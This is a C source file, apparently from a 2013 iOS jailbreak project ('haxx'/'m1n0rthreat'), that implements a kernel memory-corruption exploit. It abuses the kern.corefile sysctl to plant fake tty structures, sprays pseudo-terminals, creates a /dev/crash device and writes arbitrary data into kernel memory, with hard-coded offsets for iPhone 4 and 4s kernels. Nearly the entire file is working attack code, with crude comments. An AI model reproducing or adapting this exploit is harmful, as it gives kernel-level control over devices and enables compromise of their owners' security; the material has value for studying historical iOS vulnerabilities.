//
//  main.c
//  haxx
//
//  Created by Joshua Hill on 12/17/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <unistd.h>
#include <syslog.h>
#include <mach/mach.h>

#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/sysctl.h>

#include <CoreFoundation/CoreFoundation.h>

#include "m1n0rthreat.h"

unsigned long KASLR_BASE = 0;
unsigned int m1n0rthreat_has_init = 0;

// 0x81620579 - 0x81601000 = 0x1F579 (iPhone4s 7.0.4)
/* defines from the iPhone 4 7.0.4 kernel */
//#define COREFILE_SYSCTL_DATA 0x334AE4 // this contains a pointer to the address to write (set by sysctl call)
//#define PTSD_START 0x27A11D // actually linew function pointer in tty (addesss to exec)
//#define KERN_UUID 0x346170 // This is the actuall address to write to sprayed into the fake ttys

// iPhone4s 6.1.3
//#define PTSD_START (0x1F41BD-0x1000)
//#define KERN_UUID (0x31F920-0x1000)
//#define COREFILE_SYSCTL_DATA (0x2E6A08-0x1000)

vm_address_t m1n0rthreat_kernel_get(vm_address_t address);
void m1n0rthreat_kernel_set(vm_address_t address, void* value);
vm_size_t m1n0rthreat_kernel_read(vm_address_t addr, void* buffer, vm_size_t size);
vm_size_t m1n0rthreat_kernel_write(vm_address_t addr, void* buffer, vm_size_t size);

void add_write_clist(int *faketty, int addr) {
    int dump_addr = addr; /* kern uuid */
    faketty[0] = 0;
    faketty[1] = 0x400;
    faketty[2] = dump_addr;
    faketty[3] = dump_addr;
    faketty[4] = dump_addr;
    faketty[5] = dump_addr + 0x400;
    faketty[6] = 0;
    faketty[7] = 0;
}

void printuuid() {
    char crap[0x100];
    memset(crap, 0, 0x100);
    size_t size = 0x100;
    int ret = sysctlbyname("kern.uuid", crap, &size, NULL, NULL);
    syslog(LOG_ERR, "++[HAXX]++ uuid(%d) %s\n", ret, crap);
}

void printkerncore() {
    char crap[0x100];
    memset(crap, 0, 0x100);
    size_t size = 0x100;
    int ret = sysctlbyname("kern.corefile", crap, &size, NULL, NULL);
    syslog(LOG_ERR, "++[HAXX]++ corefile(%d) %s\n", ret, crap);
}

int m1n0rthreat_exploit(vm_address_t base) {
    int i, ret = 0;int crashfd = 0;
    syslog(LOG_ERR, "++[HAXX]++ Exploiting haxx.dylib\n");
    
    KASLR_BASE = base;
    syslog(LOG_ERR, "++[HAXX]++ kaslr base @ 0x%lx\n", KASLR_BASE);
    
    /* not eating dicks yet */
    printuuid();
    
    int faketty[0x40];
    memset(faketty, 0, sizeof(faketty));
    faketty[2] = 0x22;
    /* this gets run when write is called, PC control */
    faketty[0xEC/4] = KASLR_BASE + PTSD_START;
    
    /* output clist */
    //add_write_clist(&faketty[3], KERN_UUID);
    //add_write_clist(&faketty[0xb], KERN_UUID);
    //add_write_clist(&faketty[0x13], KERN_UUID);
    
    //void printkerncore();
    ret = sysctlbyname("kern.corefile", NULL, NULL, faketty, sizeof(faketty));
    syslog(LOG_ERR, "++[HAXX]++ sysctl returned %d\n", ret);
    //void printkerncore();
    
    /* tty alloc should go to 0x140, and we hope the array is in the middle of ttys */
    /* if more than 8 are alloced this will fail */
    /* slots are 0x180 big, so tty starts at +0x180 */
    for (i = 0; i < 0x138/4; i++) {
        int fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        grantpt(fd);
        unlockpt(fd);
        int pfd = open(ptsname(fd), O_RDWR);
        
        // now that it's open we can write
        int writedata[2];
        writedata[0] = KASLR_BASE + COREFILE_SYSCTL_DATA;
        writedata[1] = 0xFFFFFFFF;
        
        ret = write(fd, writedata, 8); // Writing the pointer to our pointer in each pty
        
        syslog(LOG_ERR, "++[HAXX]++ got %d %s %d\n", fd, ptsname(fd), ret);
    }
    
    // ok, when the alloc is at 0x304 the new raw ptr is at 0x498, 0x194 apart
    ret = mknod("/dev/crash", S_IFCHR | 0666, makedev(16, 0x194/4));
    syslog(LOG_ERR, "++[HAXX]++ mknod returned %d\n", ret);
    
    // i open at the close
    crashfd = open("/dev/crash", O_RDWR|O_NOCTTY|O_NONBLOCK);
    syslog(LOG_ERR, "++[HAXX]++ open returned %d %d\n", crashfd, errno);
    
    // write to kernel
    //ret = write(crashfd, "p0sixninjas\0", strlen("p0sixninjas")+1); // finally write to our pointer
    //syslog(LOG_ERR, "++[HAXX]++ write returned %d\n", ret);
    
    // success
    printuuid();
}

int m1n0rthreat_init(vm_address_t base) {
    KASLR_BASE = base;
    m1n0rthreat_has_init = 1;
    return 0;
}

vm_address_t m1n0rthreat_kernel_get(vm_address_t address) {
    //exploit();
    return NULL;
}

void m1n0rthreat_kernel_set(vm_address_t address, void* value) {
    //exploit();
}

vm_size_t m1n0rthreat_kernel_read(vm_address_t addr, void* buffer, vm_size_t size) {
    //exploit();
    return 0;
}

vm_size_t m1n0rthreat_kernel_write(vm_address_t addr, void* buffer, vm_size_t size) {
    int i, ret = 0;int crashfd = 0;
    syslog(LOG_ERR, "++[HAXX]++ Exploiting haxx.dylib\n");
    
    //KASLR_BASE = base;
    syslog(LOG_ERR, "++[HAXX]++ kaslr base @ 0x%lx\n", KASLR_BASE);
    
    /* not eating dicks yet */
    //printuuid();
    
    int faketty[0x40];
    memset(faketty, 0, sizeof(faketty));
    faketty[2] = 0x22;
    /* this gets run when write is called, PC control */
    faketty[0xEC/4] = KASLR_BASE + PTSD_START;
    
    /* output clist */
    add_write_clist(&faketty[3], addr);
    add_write_clist(&faketty[0xb], addr);
    add_write_clist(&faketty[0x13], addr);
    
    //void printkerncore();
    ret = sysctlbyname("kern.corefile", NULL, NULL, faketty, sizeof(faketty));
    syslog(LOG_ERR, "++[HAXX]++ sysctl returned %d\n", ret);
    //void printkerncore();
    
    /* tty alloc should go to 0x140, and we hope the array is in the middle of ttys */
    /* if more than 8 are alloced this will fail */
    /* slots are 0x180 big, so tty starts at +0x180 */
    for (i = 0; i < 0x138/4; i++) {
        int fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        grantpt(fd);
        unlockpt(fd);
        int pfd = open(ptsname(fd), O_RDWR);
        
        // now that it's open we can write
        int writedata[2];
        writedata[0] = (KASLR_BASE + COREFILE_SYSCTL_DATA);
        writedata[1] = 0xFFFFFFFF;
        ret = write(fd, writedata, 8); // Writing the pointer to our pointer in each pty
        
        syslog(LOG_ERR, "++[HAXX]++ got %d %s %d\n", fd, ptsname(fd), ret);
    }
    
    // ok, when the alloc is at 0x304 the new raw ptr is at 0x498, 0x194 apart
    ret = mknod("/dev/crash", S_IFCHR | 0666, makedev(16, 0x194/4));
    syslog(LOG_ERR, "++[HAXX]++ mknod returned %d\n", ret);
    
    // i open at the close
    crashfd = open("/dev/crash", O_RDWR|O_NOCTTY|O_NONBLOCK);
    syslog(LOG_ERR, "++[HAXX]++ open returned %d %d\n", crashfd, errno);
    
    // write to kernel
    ret = write(crashfd, buffer, size); // finally write to our pointer
    syslog(LOG_ERR, "++[HAXX]++ write returned %d\n", ret);
    
    // success
    //printuuid();
    return ret;
}

